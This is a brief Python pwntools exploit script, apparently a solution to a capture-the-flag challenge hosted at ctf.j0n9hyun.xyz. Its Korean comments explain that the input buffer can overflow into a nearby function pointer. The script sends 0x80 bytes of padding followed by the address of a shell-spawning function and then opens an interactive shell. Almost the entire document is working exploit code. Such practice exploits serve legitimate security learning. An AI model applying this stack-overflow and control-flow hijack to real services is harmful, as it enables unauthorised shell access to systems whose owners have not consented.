from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3001)

# 입력은 rbp-0x8c
# 함수포인터를 실행하는 부분이 있고, 함수포인터는 rbp-0xc
# fget로 입력을 0x85만큼 받기 떄문에 함수포인터를 덮을 수 있다.
# shell을 실행하는 함수가 있으므로
# dummy를 덮고 함수포인터를 shell 함수로 덮어줌
dummy = b"A"*(0x8c-0xc)
shell = p32(0x0804849b)
payload = dummy + shell
r.send(payload)

r.interactive()